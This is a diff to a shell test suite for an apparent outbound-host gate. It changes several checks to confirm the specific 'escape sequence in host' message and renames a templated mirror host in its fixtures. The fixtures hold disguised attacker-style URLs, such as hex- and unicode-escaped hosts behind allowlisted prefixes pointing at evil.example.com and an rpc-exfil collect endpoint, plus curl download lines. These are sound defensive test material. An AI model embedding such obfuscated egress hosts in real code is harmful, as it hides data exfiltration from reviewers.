@@ -294,17 +294,27 @@ check "a host that is only a backtick expression is skipped" allow "$sample_dir/
 check "a backtick after a literal prefix is still checked" block "$sample_dir/y6.sh" \
   'curl https://evil.example.com\x60x\x60/y'
 
-check "backslash escape in a python host" block "$sample_dir/z1.py" \
-  'U = "https://\\x65vil.example.com/x"'
+# These assert the MESSAGE, not just the exit code. The backslash check and
+# the character check both reject these, so an exit code proves nothing about
+# which one fired: neutering the backslash check leaves every one of them
+# still blocked, by the character check, with a different message. check_msg
+# is what makes the backslash check a tested control rather than a shadowed
+# one.
+check_msg "backslash escape in a python host" "$sample_dir/z1.py" \
+  'U = "https://\x65vil.example.com/x"' \
+  'escape sequence in host'
 
-check "backslash escape in a typescript host" block "$sample_dir/z2.ts" \
-  'const u = "https://\\x65rpc-exfil.example.net/collect";'
+check_msg "backslash escape in a typescript host" "$sample_dir/z2.ts" \
+  'const u = "https://\x65rpc-exfil.example.net/collect";' \
+  'escape sequence in host'
 
-check "backslash escape in a rust host" block "$sample_dir/z3.rs" \
-  'const U: &str = "https://\\u{65}vil.example.com/x";'
+check_msg "backslash escape in a rust host" "$sample_dir/z3.rs" \
+  'const U: &str = "https://\u{65}vil.example.com/x";' \
+  'escape sequence in host'
 
-check "escape after an allowlisted prefix (typescript)" block "$sample_dir/z1b.ts" \
-  'const u = "https://github.com\\x2eevil.example.net/c";'
+check_msg "escape after an allowlisted prefix (typescript)" "$sample_dir/z1b.ts" \
+  'const u = "https://github.com\x2eevil.example.net/c";' \
+  'escape sequence in host'
 
 check "escape after an allowlisted prefix (python)" block "$sample_dir/z2b.py" \
   'U = "https://install.erpc.global\\x2eevil.example.net/x"'
@@ -332,8 +342,12 @@ check "snapshot mirror matched by pattern" allow "$sample_dir/i.rs" \
 check "loopback over plain http" allow "$sample_dir/j.rs" \
   'const CB: &str = "http://127.0.0.1:53123/callback";'
 
-check "template expression as the host" allow "$sample_dir/k.yml" \
-  '      - run: curl -sSfL "https://${{ env.MIRROR }}/erpc.tar.xz"'
+# A wholly-templated host is a STATED LIMIT, not an endorsement: in a
+# workflow this is exactly where an egress could be introduced, and the gate
+# cannot see where it points. The fixture no longer names the release mirror,
+# which this branch removes.
+check "a wholly-templated host is skipped, by stated limit" allow "$sample_dir/k.yml" \
+  '      - run: curl -sSfL "https://${{ env.ARCHIVE_HOST }}/erpc.tar.xz"'
 
 check "declared documentation host in prose" allow "$sample_dir/l.md" \
   'See https://keepachangelog.com/en/1.1.0/ for the format.'
@@ -355,7 +369,7 @@ check "ws on loopback" allow "$sample_dir/z5.rs" \
   'const W: &str = "ws://127.0.0.1:20026/v1/session/ws";'
 
 check "leading dollar-brace host is skipped" allow "$sample_dir/z6.sh" \
-  'curl -sSfL "https://${MIRROR}/erpc.tar.xz"'
+  'curl -sSfL "https://${ARCHIVE_HOST}/erpc.tar.xz"'
 
 check "leading command substitution host is skipped" allow "$sample_dir/z7.sh" \
   'curl -sSfL "https://$(cat host)/erpc.tar.xz"'
